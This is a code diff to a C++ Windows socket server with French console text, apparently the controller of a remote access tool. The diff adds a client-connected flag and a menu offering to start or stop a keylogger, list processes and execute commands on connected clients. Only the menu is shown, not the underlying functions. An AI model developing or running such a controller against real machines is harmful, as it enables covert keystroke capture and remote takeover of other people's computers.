@@ -7,6 +7,8 @@
 
 using namespace std;
 
+bool isClientConnected = false;
+
 int main() {
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
@@ -50,6 +52,7 @@ int main() {
                 auto newClient = serveur.acceptSocket();
                 cout << "Nouveau client : " << newClient->getClientIP() << endl;
                 clients.push_back(move(newClient));
+                isClientConnected = true;
             }
 
             for (auto it = clients.begin(); it != clients.end(); ) {
@@ -77,6 +80,22 @@ int main() {
                 } else {
                     ++it;
                 }
+            }
+
+            if (isClientConnected) {
+                cout << "-------------------------------------" << endl;
+                cout << "Nombre de clients connectés : " << clients.size() << endl;
+                cout << "1 - Afficher la liste des clients" << endl;
+                cout << "2 - Envoyer un message au client" << endl;
+                cout << "3 - Afficher les informations du client" << endl;
+                cout << "4 - Démarrer le keylogger" << endl;
+                cout << "5 - Eteindre le keylogger" << endl;
+                cout << "6 - Afficher la liste des processus" << endl;
+                cout << "7 - Exécuter une commande" << endl;
+                cout << "8 - Quitter" << endl;
+                cout << "Choisissez une option : ";
+                int choice;
+                cin >> choice;
             }
         }
 
